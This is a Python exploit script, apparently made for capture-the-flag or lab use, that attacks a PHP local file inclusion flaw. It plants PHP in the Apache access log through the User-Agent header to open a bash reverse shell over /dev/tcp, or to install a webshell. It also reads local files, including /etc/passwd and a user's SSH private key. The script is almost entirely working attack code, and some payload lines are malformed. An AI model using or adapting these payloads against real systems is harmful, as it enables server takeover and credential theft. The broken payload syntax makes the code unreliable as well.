#!/usr/bin/python3

import os 
import sys 
from time import sleep 
import requests 
import argparse 

#Modificar el exploit para su uso correcto

parser = argparse.ArgumentParser()

parser.add_argument("--rshell", help="""Get one reverse shell for netcat. 
					Ex: http://127.0.0.1/test.php?file=/var/log/apache2/access.log """)
parser.add_argument("--rfiles", help="""Read local files.
					Ex: http://127.0.0.1/test.php?file=""")
parser.add_argument("--wshell", help="""Get a webshell.
					Ex: http://127.0.0.1/test.php?file=/var/log/apache2/access.log""")
parser.add_argument("--info", help="""information extraction: id_rsa, /etc/subgid, /etc/passwd etc...
					Ex: http://127.0.0.1/test.php?file=""")

args = parser.parse_args()

revshell = {"User_Agent": "<?php system($_REQUESTS'bash -i >& /dev/tcp/<IP>/443 0>&1'); ?>"}
webshell = {"User-Agent": "<?php shell_exec($_REQUESTS['cmd']); ?>'); ?>"}

if args.rshell:
	print("\nlisten on netcat")
	sleep(2)
	response = requests.post(args.rshell, headers=revshell)
	sleep(2)
	print("\nReverse shell: Pwned")
	sys.exit(0)

elif args.rfiles:
	while True:
		readfiles = input("\nRead File: ")
		print("")
		url = (args.rfiles + readfiles)
		os.system(f""" curl -s -X POST "{url}" \n""") 	

elif args.wshell:
	response = requests.post(args.wshell, headers=webshell)
	sleep(2)
	print(f"\nPwned Webshell: {args.wshell}&cmd=<command>")
	sleep(2)
	sys.exit(0)

elif args.info:
	print("\n--------------------------------")
	etc_subgid = os.system(""" curl -s -X GET "{}/etc/subgid" """.format(args.info))
	sleep(2)

	print("\n\n--------------------------------")
	id_rsa = os.system(f"curl -s -X GET {args.info}/home/<name>/.ssh/id_rsa")
	print("\n\n--------------------------------")
	sleep(2)

	etc_hosts = os.system(f"curl -s -X GET {args.info}/etc/hosts")
	print("\n\n--------------------------------")
	sleep(2)
	
	etc_passwd = os.system(f"curl -s -X GET {args.info}/etc/passwd")
	print("\n\n--------------------------------")
else:
	sys.exit(1)
